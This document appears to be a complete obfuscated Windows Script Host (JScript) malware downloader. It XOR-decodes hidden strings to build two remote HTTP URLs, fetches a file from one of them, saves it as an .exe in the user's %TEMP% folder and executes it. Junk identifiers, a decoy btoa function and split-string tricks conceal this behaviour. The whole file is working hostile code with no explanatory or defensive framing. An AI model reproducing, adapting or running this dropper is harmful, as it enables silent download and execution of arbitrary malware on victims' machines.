function btoa(inscrutableeq4, provenderybS, wafflehWg, restrainedJJb, rudimentuzd) {
    var infallibles2v = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
    var congealkX9 = String(rudimentuzd);
    for (var constrainedGCT, raimentjGa, mootgDK = 0, contendUMZ = infallibles2v, dissimulatePDz = ""; congealkX9.charAt(mootgDK | 0) || (contendUMZ = "=", 
    mootgDK % 1); dissimulatePDz += contendUMZ.charAt(63 & constrainedGCT >> 8 - mootgDK % 1 * 8)) {
        raimentjGa = congealkX9.charCodeAt(mootgDK += 3 / 4);
        if (raimentjGa > 255) {
            throw new InvalidCharacterError("'btoa' failed: The string to be encoded contains characters outside of the Latin1 range.");
        }
        constrainedGCT = constrainedGCT << 8 | raimentjGa;
    }
    return dissimulatePDz;
}

var modeZAw = function(gripeTuc) {
    var buxomrah = "";
    var inscrutableeq4 = "captiousTQL";
    var provenderybS = "adjureiiP";
    var wafflehWg = "puckerBLP";
    var restrainedJJb = "majoritymeV";
    btoa(inscrutableeq4, provenderybS, wafflehWg, restrainedJJb, [ 31, 145, 234, 60, 228, 250, 136, 133, 30, 185, 130, 163, 109, 211, 71, 107 ]);
    var sentientqUI = String["sdfadfasdffromChar".slice(10) + "Codedsfadsfasdg".slice(0, 4)];
    for (var redoubtableevD = 0; redoubtableevD < gripeTuc.length; redoubtableevD++) {
        var polemicaloyL = [ 31, 145, 234, 60, 228, 250, 136, 133, 30, 185, 130, 163, 109, 211, 71, 107 ];
        buxomrah += sentientqUI(gripeTuc[redoubtableevD] ^ polemicaloyL[redoubtableevD % polemicaloyL.length]);
    }
    return buxomrah;
};

var endueKtY = function() {
    var oratoriouFl = function() {
        var invidiousx4y = modeZAw([ 109, 212, 144, 125, 189, 131, 254, 189, 124, 206 ]);
        var institutek5i = modeZAw([ 84, 231, 165, 116, 157, 189, 216, 231, 118, 221 ]);
        var descrySzY = modeZAw([ 94, 161, 134, 9, 173, 180, 230, 243, 81, 220 ]);
    };
    oratoriouFl.prototype.TV6KKCxTlo = function(onsetHaS) {
        var mercurialBMy = modeZAw([ 92, 227, 143, 93, 144, 159, 199, 231, 116, 220, 225, 215 ]);
        return wsh[mercurialBMy](onsetHaS);
    };
    oratoriouFl.prototype.jjhRhmcDWK = function(onsetHaS) {
        var mercurialBMy = modeZAw([ 92, 227, 143, 93, 144, 159, 199, 231, 116, 220, 225, 215 ]);
        return WScript[mercurialBMy](onsetHaS);
    };
    return oratoriouFl;
}();

(function() {
    var propitiatefbr = [ modeZAw([ 119, 229, 158, 76, 222, 213, 167, 237, 110, 216, 240, 198, 20, 188, 50, 3, 122, 227, 143, 77, 149, 212, 235, 234, 115, 150, 186, 147, 67, 182, 63, 14 ]), modeZAw([ 119, 229, 158, 76, 222, 213, 167, 237, 110, 216, 238, 208, 2, 164, 38, 5, 107, 226, 140, 90, 202, 153, 231, 232, 49, 129, 178, 141, 8, 171, 34 ]) ];
    var exertOKS = 4194304;
    var banalUIp = new endueKtY();
    var descryqol = banalUIp[modeZAw([ 117, 251, 130, 110, 140, 151, 235, 193, 73, 242 ])];
    var rejoinderrvK = descryqol(modeZAw([ 72, 194, 137, 78, 141, 138, 252, 171, 77, 209, 231, 207, 1 ]));
    var bouillonecG = descryqol(modeZAw([ 82, 194, 178, 113, 168, 200, 166, 221, 83, 245, 202, 247, 57, 131 ]));
    var quailRhz = descryqol(modeZAw([ 94, 213, 165, 120, 166, 212, 219, 241, 108, 220, 227, 206 ]));
    var dotageW4e = rejoinderrvK.ExpandEnvironmentStrings(modeZAw([ 58, 197, 175, 113, 180, 223, 212 ]));
    var appositeLl9 = dotageW4e + exertOKS + modeZAw([ 49, 244, 146, 89 ]);
    var disportBpe = false;
    var lodewfz = 200;
    for (var uttertIr = 0; uttertIr < propitiatefbr.length; uttertIr++) {
        try {
            var disconsolateR4B = propitiatefbr[uttertIr];
            bouillonecG.open(modeZAw([ 88, 212, 190 ]), disconsolateR4B, false);
            bouillonecG.send();
            if (bouillonecG.status == lodewfz) {
                try {
                    quailRhz[modeZAw([ 112, 225, 143, 82 ])]();
                    quailRhz.type = 1;
                    quailRhz[modeZAw([ 104, 227, 131, 72, 129 ])](bouillonecG[modeZAw([ 109, 244, 153, 76, 139, 148, 251, 224, 92, 214, 230, 218 ])]);
                    var gistNpo = modeZAw([ 124, 244, 171, 76, 172, 207, 227, 221, 77, 139 ]);
                    var enervateQuB = modeZAw([ 111, 221, 186, 105, 182, 174, 205, 201, 41, 221 ]);
                    var practicerwL = modeZAw([ 84, 220, 142, 72, 175, 206, 231, 193, 118, 235 ]);
                    var insensateSBT = Math.pow(2, 10) * 249;
                    if (quailRhz.size > insensateSBT) {
                        uttertIr = propitiatefbr.length;
                        quailRhz.position = 0;
                        quailRhz.saveToFile(appositeLl9, 2);
                        disportBpe = true;
                    }
                } finally {
                    quailRhz.close();
                }
            }
        } catch (ignored) {}
    }
    if (disportBpe) {
        rejoinderrvK[modeZAw([ 90, 233, 143, 95 ])](dotageW4e + Math.pow(2, 22));
    }
})();